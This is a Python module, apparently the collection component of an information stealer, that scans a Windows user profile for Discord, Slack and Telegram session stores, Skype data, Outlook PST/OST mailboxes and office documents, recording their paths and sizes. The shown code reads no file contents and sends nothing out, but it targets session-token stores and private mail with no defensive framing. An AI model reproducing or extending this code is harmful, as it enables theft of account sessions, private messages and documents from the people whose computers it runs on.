"""
User & Communication Data
- Messaging apps: Discord, Slack, Telegram, Skype (chat logs & files)
- Email clients: Outlook PST/OST
- Documents: targeted file types from Desktop, Documents, Downloads
"""
import os
import shutil

class UserDataCollector:
    @staticmethod
    def collect():
        data = {}
        data['messaging'] = UserDataCollector._get_messaging_data()
        data['emails'] = UserDataCollector._get_email_files()
        data['documents'] = UserDataCollector._get_documents()
        return data

    @staticmethod
    def _get_messaging_data():
        messaging = {}
        # Discord
        discord_paths = [
            os.path.expanduser("~\\AppData\\Roaming\\discord\\Local Storage\\leveldb"),
            os.path.expanduser("~\\AppData\\Roaming\\discord\\Cache")
        ]
        discord_data = []
        for path in discord_paths:
            if os.path.exists(path):
                try:
                    files = os.listdir(path)[:10]  # sample
                    discord_data.append({"path": path, "files": files})
                except:
                    continue
        messaging['discord'] = discord_data

        # Slack
        slack_paths = [
            os.path.expanduser("~\\AppData\\Roaming\\Slack\\Local Storage\\leveldb"),
            os.path.expanduser("~\\AppData\\Roaming\\Slack\\Cache")
        ]
        slack_data = []
        for path in slack_paths:
            if os.path.exists(path):
                try:
                    files = os.listdir(path)[:10]
                    slack_data.append({"path": path, "files": files})
                except:
                    continue
        messaging['slack'] = slack_data

        # Telegram
        tg_path = os.path.expanduser("~\\AppData\\Roaming\\Telegram Desktop\\tdata")
        if os.path.exists(tg_path):
            try:
                files = os.listdir(tg_path)[:10]
                messaging['telegram'] = {"path": tg_path, "files": files}
            except:
                pass

        # Skype
        skype_path = os.path.expanduser("~\\AppData\\Roaming\\Skype\\Application Data\\Skype")
        if os.path.exists(skype_path):
            try:
                files = os.listdir(skype_path)[:10]
                messaging['skype'] = {"path": skype_path, "files": files}
            except:
                pass

        return messaging

    @staticmethod
    def _get_email_files():
        emails = []
        outlook_paths = [
            os.path.expanduser("~\\Documents\\Outlook Files"),
            os.path.expanduser("~\\AppData\\Local\\Microsoft\\Outlook")
        ]
        for path in outlook_paths:
            if os.path.exists(path):
                for file in os.listdir(path):
                    if file.lower().endswith('.pst') or file.lower().endswith('.ost'):
                        full = os.path.join(path, file)
                        try:
                            size = os.path.getsize(full)
                            emails.append({"path": full, "size_bytes": size})
                        except:
                            continue
        return emails

    @staticmethod
    def _get_documents():
        docs = []
        extensions = ['.pdf', '.docx', '.xlsx', '.pptx', '.txt', '.rtf', '.odt', '.ods', '.odp', '.csv']
        folders = ['Desktop', 'Documents', 'Downloads']
        for folder in folders:
            dir_path = os.path.join(os.path.expanduser('~'), folder)
            if os.path.exists(dir_path):
                for root, _, files in os.walk(dir_path):
                    # limit depth
                    if root.count(os.sep) - dir_path.count(os.sep) > 2:
                        continue
                    for file in files:
                        if any(file.lower().endswith(ext) for ext in extensions):
                            try:
                                path = os.path.join(root, file)
                                size = os.path.getsize(path)
                                if size < 10 * 1024 * 1024:  # <10MB
                                    # For demo, we could read content, but we'll just store metadata
                                    docs.append({"path": path, "size_bytes": size})
                            except:
                                continue
                    if len(docs) > 50:
                        break
        return docs
